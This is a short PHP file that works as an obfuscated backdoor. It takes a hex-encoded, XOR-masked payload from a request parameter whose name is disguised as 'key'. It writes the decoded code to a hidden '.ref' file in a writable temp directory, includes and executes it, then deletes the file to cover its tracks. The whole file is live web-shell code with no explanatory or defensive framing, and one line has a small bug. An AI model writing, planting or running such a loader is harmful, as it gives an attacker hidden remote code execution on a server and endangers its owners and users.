<?php

if(isset($_REQUEST) && isset($_REQUEST["\x6Be\x79"])){
$resource = hex2bin($_REQUEST["\x6Be\x79"]);
$flg      =   ''   ;     for($u=0;$u<strlen($resource);$u++){$flg.=chr(ord($resource[$u])^54);}
$holder = array_filter(["/dev/shm", getenv("TEMP"), ini_get("upload_tmp_dir"), getenv("TMP"), "/tmp", "/var/tmp", session_save_path(), sys_get_temp_dir(), getcwd()]);
$data = 0;
do {
    $hld = $holder[$data] ?? null;
    if ($data >= count(holder)) break;
            if ((bool)is_dir($hld) && (bool)is_writable($hld)) {
            $parameter_group = str_replace("{var_dir}", $hld, "{var_dir}/.ref");
            if (file_put_contents($parameter_group, $flg)) {
    include $parameter_group;
    @unlink($parameter_group);
    exit;
}
        }
    $data++;
} while (true);
}